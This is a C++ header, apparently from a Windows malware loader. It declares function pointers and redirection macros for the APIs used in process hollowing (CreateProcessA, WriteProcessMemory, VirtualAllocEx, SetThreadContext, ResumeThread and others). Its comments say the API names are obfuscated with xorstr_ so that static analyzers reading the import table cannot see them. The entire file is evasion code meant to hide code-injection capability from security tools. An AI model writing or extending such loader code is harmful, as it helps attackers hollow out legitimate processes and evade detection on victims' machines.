#pragma once

// Dynamically resolves the WinAPI functions that together form the
// "process hollower" import signature (CreateProcessA + WriteProcessMemory
// + VirtualAllocEx + SetThreadContext + ResumeThread + ...). All names
// are obfuscated via xorstr_ so they don't appear in .rdata. Static
// analyzers reading the loader's import table won't see any of these.
//
// Usage:
// 1. #include "winapi.h" AFTER any other Windows headers.
// 2. Call winapi::init() once at startup; bail if it returns false.
// 3. Use the API names normally - macros below redirect each call to
// the resolved function pointer.

#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>

namespace winapi {

extern decltype(&::CreateProcessA) pCreateProcessA;
extern decltype(&::WriteProcessMemory) pWriteProcessMemory;
extern decltype(&::ReadProcessMemory) pReadProcessMemory;
extern decltype(&::VirtualAllocEx) pVirtualAllocEx;
extern decltype(&::VirtualProtectEx) pVirtualProtectEx;
extern decltype(&::VirtualFreeEx) pVirtualFreeEx;
extern decltype(&::GetThreadContext) pGetThreadContext;
extern decltype(&::SetThreadContext) pSetThreadContext;
extern decltype(&::Wow64GetThreadContext) pWow64GetThreadContext;
extern decltype(&::Wow64SetThreadContext) pWow64SetThreadContext;
extern decltype(&::ResumeThread) pResumeThread;
extern decltype(&::TerminateProcess) pTerminateProcess;
extern decltype(&::OpenProcess) pOpenProcess;
extern decltype(&::CreateToolhelp32Snapshot) pCreateToolhelp32Snapshot;
extern decltype(&::Process32FirstW) pProcess32FirstW;
extern decltype(&::Process32NextW) pProcess32NextW;
extern decltype(&::EnumProcessModules) pEnumProcessModules;
extern decltype(&::GetModuleFileNameExA) pGetModuleFileNameExA;

bool init();

} // namespace winapi

// Redirection macros - every direct call in this translation unit gets
// rerouted through the resolved pointer. Defined AFTER the Windows
// headers above so they don't disrupt the original declarations.
#define CreateProcessA winapi::pCreateProcessA
#define WriteProcessMemory winapi::pWriteProcessMemory
#define ReadProcessMemory winapi::pReadProcessMemory
#define VirtualAllocEx winapi::pVirtualAllocEx
#define VirtualProtectEx winapi::pVirtualProtectEx
#define VirtualFreeEx winapi::pVirtualFreeEx
#define GetThreadContext winapi::pGetThreadContext
#define SetThreadContext winapi::pSetThreadContext
#define Wow64GetThreadContext winapi::pWow64GetThreadContext
#define Wow64SetThreadContext winapi::pWow64SetThreadContext
#define ResumeThread winapi::pResumeThread
#define TerminateProcess winapi::pTerminateProcess
#define OpenProcess winapi::pOpenProcess
#define CreateToolhelp32Snapshot winapi::pCreateToolhelp32Snapshot
#define Process32FirstW winapi::pProcess32FirstW
#define Process32NextW winapi::pProcess32NextW
#define EnumProcessModules winapi::pEnumProcessModules
#define GetModuleFileNameExA winapi::pGetModuleFileNameExA
